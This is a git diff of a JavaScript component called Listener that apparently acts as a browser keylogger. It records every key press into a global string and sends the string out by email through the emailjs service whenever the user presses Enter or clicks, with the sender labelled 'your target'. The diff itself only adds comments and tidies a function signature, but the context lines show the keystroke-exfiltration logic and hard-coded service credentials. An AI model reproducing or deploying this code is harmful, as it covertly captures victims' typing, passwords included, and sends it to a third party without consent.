@@ -5,6 +5,10 @@ var emailParams = {}
 
 export default function Listener() {
 
+    /**
+     * Tracks key presses and adds key identifiers to global keyString
+     * @param {event} keypress event 
+     */
     function buildKeyString (e) {
         var result = ''
         var character = String.fromCharCode(e.keyCode)
@@ -19,6 +23,10 @@ export default function Listener() {
         e.stopImmediatePropagation();
     })
 
+    /**
+     * Will call function to send email upon enter key being pressed, but only if there is content added to the global keyString
+     * @param {event} keyup event
+     */
     function sendStringEnter (e) {
         emailParams = {
             from_name: "your target",
@@ -37,6 +45,10 @@ export default function Listener() {
         e.stopImmediatePropagation();
     })
 
+    /**
+     * Will call function to send email upon the left click button being pressed, but only if there is content added to the global keyString
+     * @param {event} mouseup event
+     */
     function sendStringClick (e) {
         emailParams = {
             from_name: "your target",
@@ -55,9 +67,10 @@ export default function Listener() {
         e.stopImmediatePropagation();
     })
 
-
-
-    const sendEmail = (e) => {
+    /**
+     * Will send email via the emailjs module
+     */
+    const sendEmail = () => {
         emailjs.send('service_75hzedc', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
         .then((result) => {
             console.log(result.text);
